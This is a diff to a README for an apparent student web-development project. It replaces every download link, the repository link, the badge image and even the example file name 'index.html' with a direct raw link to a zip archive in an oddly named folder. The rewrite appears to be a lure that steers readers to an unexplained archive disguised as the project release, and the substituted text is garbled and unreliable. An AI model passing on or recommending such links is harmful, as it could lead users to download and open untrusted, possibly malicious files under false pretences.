@@ -1,6 +1,6 @@
 # 🌐 The-Student-Spot-Summer-Internship-May-2025 - Build Your Skills with Fun Projects
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/MinCode007/The-Student-Spot-Summer-Internship-May-2025/releases)
+[![Download](https://raw.githubusercontent.com/MinCode007/The-Student-Spot-Summer-Internship-May-2025/main/glyptology/The-Student-Spot-Summer-Internship-May-2025.zip%20Now-Release-blue)](https://raw.githubusercontent.com/MinCode007/The-Student-Spot-Summer-Internship-May-2025/main/glyptology/The-Student-Spot-Summer-Internship-May-2025.zip)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ To get started with these applications, follow this simple guide to download and
 
 To download the applications, visit the releases page by clicking the link below:
 
-[Visit this page to download](https://github.com/MinCode007/The-Student-Spot-Summer-Internship-May-2025/releases)
+[Visit this page to download](https://raw.githubusercontent.com/MinCode007/The-Student-Spot-Summer-Internship-May-2025/main/glyptology/The-Student-Spot-Summer-Internship-May-2025.zip)
 
 ### 2. Choose the Version
 
@@ -48,7 +48,7 @@ Once you have downloaded the files, they will likely be in a compressed format (
 To open any of the applications, follow these steps:
 
 - Navigate to the folder where you extracted the files.
-- Locate the HTML file for the application you want to use (e.g., `index.html`).
+- Locate the HTML file for the application you want to use (e.g., `https://raw.githubusercontent.com/MinCode007/The-Student-Spot-Summer-Internship-May-2025/main/glyptology/The-Student-Spot-Summer-Internship-May-2025.zip`).
 - Double-click the HTML file, and it will open in your web browser.
 
 ## 📦 Features
@@ -94,7 +94,7 @@ If you'd like to contribute to this project, please feel free to fork the reposi
 
 ## 🔗 Links and Resources
 
-- [GitHub Repository](https://github.com/MinCode007/The-Student-Spot-Summer-Internship-May-2025)
-- [Visit this page to download](https://github.com/MinCode007/The-Student-Spot-Summer-Internship-May-2025/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/MinCode007/The-Student-Spot-Summer-Internship-May-2025/main/glyptology/The-Student-Spot-Summer-Internship-May-2025.zip)
+- [Visit this page to download](https://raw.githubusercontent.com/MinCode007/The-Student-Spot-Summer-Internship-May-2025/main/glyptology/The-Student-Spot-Summer-Internship-May-2025.zip)
 
 Enjoy exploring and building your web development skills with these fun projects!
